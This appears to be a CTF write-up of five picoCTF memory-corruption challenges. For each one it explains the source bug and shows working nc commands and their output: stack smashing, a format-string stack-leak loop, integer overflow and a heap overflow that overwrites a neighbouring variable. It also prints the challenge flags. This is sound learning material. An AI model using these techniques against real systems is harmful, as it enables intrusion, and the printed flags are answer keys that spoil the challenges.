# buffer overflow 0
Challenge provides a source code from which it's immediately obvious that upon a `SIGSEGV` signal the flag is given out
```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```
...
```c
signal(SIGSEGV, sigsegv_handler); // Set up signal handler
```
Therefore, let's try to enter a REALLY big input in an attempt to stack smash.
```bash
(base) achu@air ~ % nc saturn.picoctf.net 62854 <<< $(printf "Get smashed lol %.0s" {1..69})
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
(base) achu@air ~ % 
```
And we get our flag: `picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}`.

# format string 0
Same as `buffer overflow 0`, the `SIGSEGV` signal yields a flag and we'll provide a massive input to smash the stack.
```bash
(base) achu@air ~ % nc mimas.picoctf.net 56388  <<< $(printf "x%.0s" {1..6969})
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: 
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```
The flag is `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}`

# flag leak
In the source code, the unsafe function `scanf` is used
```c
scanf("%127s", story);
```
We can potentially exploit it and make it print values off the stack
```bash
(base) achu@air ~ % nc saturn.picoctf.net 62426
Tell me a story and then I'll tell you one >> %x  
Here's a story - 
ffebb4e0
(base) achu@air ~ % 
```
Automating this to run until we find a hit for string containing `CTF`
```bash
(base) achu@air ~ % i=0; while true; do output="$(echo "%${i}\$s" | nc saturn.picoctf.net 62426 2>/dev/null)"; if echo "$output" | grep -E CTF >/dev/null; then echo "Found at i=$i:"; echo "$output"; break; fi; i=$((i+1)); done

Found at i=24:
Tell me a story and then I'll tell you one >> Here's a story - 
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
(base) achu@air ~ % 
```
Reformat and our correct flag is `picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}`

# two-sum (extra)
Given the source code, we observe our point of interest which is the `addIntOvf` function.
Because our flag is printed when that function returns `-1`
```c
if (addIntOvf(sum, num1, num2) == 0) {
    printf("No overflow\n");
    fflush(stdout);
    exit(0);
} else if (addIntOvf(sum, num1, num2) == -1) {
    printf("You have an integer overflow\n");
    fflush(stdout);
}
```
Let's take a look at the definition of `addIntOvf`
```c
static int addIntOvf(int result, int a, int b) {
    result = a + b;
    if(a > 0 && b > 0 && result < 0)
        return -1;
    if(a < 0 && b < 0 && result > 0)
        return -1;
    return 0;
}
```
We need `a` and `b` to be of same sign and non-zero while result is the opposite sign of whatever `a` and `b` is for this function to return `-1` (this is not mathematically possible).
However we can cause an integer overflow with the addition `a + b`, causing a complement wrapping making `result` negative.
Proof of concept:
```c
#include <stdio.h>

int main(void) {
    int result = (1 << 31);
    printf("result = %d\n", result); // result = -2147483648
    return 0;
}
```
We'll provide `num1` as `2147483647` and `num2` as `1` to cause an overflow and consequentially produce a `result` that is negative.
```bash
(base) achu@air cryptonite_taskphase_2_achyuth % nc saturn.picoctf.net 52457 
n1 > n1 + n2 OR n2 > n1 + n2 
What two positive numbers can make this possible: 
2147483647 1
You entered 2147483647 and 1
You have an integer overflow
YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_f6ed8057}
```
Our flag is `picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_f6ed8057}`

# heap 1 (extra)
Given the source code, we can observe that we need `safe_var` to be equal `"pico"` for us to get the flag
```c
void check_win() {
    if (!strcmp(safe_var, "pico")) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}
```
We can do so by overflowing and writing onto to the adjacent value on the heap,
```bash
(base) achu@air cryptonite_taskphase_2_achyuth % nc tethys.picoctf.net 61259                                            

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x577af24af2b0  ->   pico
+-------------+----------------+
[*]   0x577af24af2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: ^C
(base) achu@air cryptonite_taskphase_2_achyuth % python3 
Python 3.13.1 (main, Dec 23 2024, 20:40:06) [Clang 16.0.0 (clang-1600.0.26.4)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x577af24af2d0 - 0x577af24af2b0
32
>>> _ * "X"
'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
>>> exit
(base) achu@air cryptonite_taskphase_2_achyuth % nc tethys.picoctf.net 61259

Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x559b41fae2b0  ->   pico
+-------------+----------------+
[*]   0x559b41fae2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXpico

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{starting_to_get_the_hang_79ee3270}
(base) achu@air cryptonite_taskphase_2_achyuth % 
```
We get the difference between the stack memory location to be `32`, we overflow by just the right amount such that `pico` gets placed in the next memory cell.
Then we print it out and get the flag.
Our flag is `picoCTF{starting_to_get_the_hang_79ee3270}`
